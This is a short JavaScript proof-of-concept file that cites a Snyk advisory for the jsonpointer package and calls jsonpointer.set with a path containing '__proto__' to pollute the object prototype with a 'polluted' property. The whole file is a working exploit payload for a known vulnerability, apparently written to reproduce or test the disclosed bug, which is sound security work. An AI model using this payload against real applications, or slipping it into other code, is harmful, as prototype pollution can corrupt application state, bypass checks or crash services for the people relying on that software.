//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288
 
  const jsonpointer = require("jsonpointer");

   
  jsonpointer.set({}, [["proto"], ["__proto__"], "polluted"], "yes");
// End of file
